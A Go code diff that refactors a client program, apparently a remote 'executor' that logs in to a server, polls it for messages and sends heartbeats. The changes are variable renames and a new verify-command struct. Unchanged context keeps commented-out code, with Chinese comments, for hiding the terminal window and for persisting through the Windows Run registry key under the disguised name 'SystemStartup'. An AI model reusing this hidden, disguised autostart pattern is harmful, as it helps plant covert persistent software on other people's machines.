@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"dominant/api/http_api"
 	"dominant/mq"
 	"dominant/server"
 	"encoding/json"
@@ -12,7 +13,7 @@ import (
 	"time"
 )
 
-var ID string
+var ExecutorId string
 
 const BaseUrl = server.BaseUrl
 
@@ -24,10 +25,10 @@ var exitChan chan bool
 
 func init() {
 	client = &http.Client{}
-	ID = "u89u89"
+	exitChan = make(chan bool)
+	ExecutorId = "u89u89"
 	token = ""
 	login()
-	exitChan = make(chan bool)
 	////隐藏终端窗口，修改windows注册表实现开机自动启动
 	//keyName := `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` //自启动注册表路径
 	//valueName := `SystemStartup`                                                  //伪装注册表名
@@ -39,8 +40,8 @@ func init() {
 }
 
 func main() {
-	log.Println(ID)
-	log.Println(token)
+	log.Println("登录id：", ExecutorId)
+	log.Println("登录token：", token)
 	if token == "" {
 		log.Println("登录失败！")
 		return
@@ -76,7 +77,7 @@ func getMessage() *mq.Message {
 	url := fmt.Sprintf("%s/getMessage", BaseUrl)
 	req, _ := http.NewRequest("GET", url, nil)
 	query := req.URL.Query()
-	query.Add("id", ID)
+	query.Add("id", ExecutorId)
 	req.URL.RawQuery = query.Encode()
 	resp, err := client.Do(req)
 	if err != nil {
@@ -97,8 +98,9 @@ func postFeedback(m *mq.Message) {
 
 func login() {
 	url := fmt.Sprintf("%s/login", BaseUrl)
+
 	data := make(map[string]string)
-	data["id"] = ID
+	data["id"] = ExecutorId
 	bytesData, err := json.Marshal(data)
 	req, _ := http.NewRequest("POST", url, bytes.NewReader(bytesData))
 	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
@@ -116,10 +118,11 @@ func login() {
 
 func alive() {
 	url := fmt.Sprintf("%s/verify", BaseUrl)
-	data := make(map[string]string)
-	data["id"] = ID
-	data["token"] = token
-	bytesData, err := json.Marshal(data)
+	cmd := http_api.VerifyCommand{
+		ID:    ExecutorId,
+		Token: token,
+	}
+	bytesData, err := json.Marshal(cmd)
 	req, _ := http.NewRequest("POST", url, bytes.NewReader(bytesData))
 	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
 	resp, err := client.Do(req)
